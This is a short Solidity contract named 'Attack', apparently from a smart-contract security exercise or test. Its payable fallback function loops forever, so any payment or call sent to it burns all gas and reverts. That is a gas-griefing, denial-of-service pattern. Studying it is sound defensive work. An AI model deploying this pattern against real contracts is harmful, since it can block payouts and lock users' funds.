// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    uint256 test;

    fallback() external payable {
        while (true) {
            uint256 one = 1;
            uint256 two = 2;
            uint256 three = one + two;
            test = three;
        }
    }
}
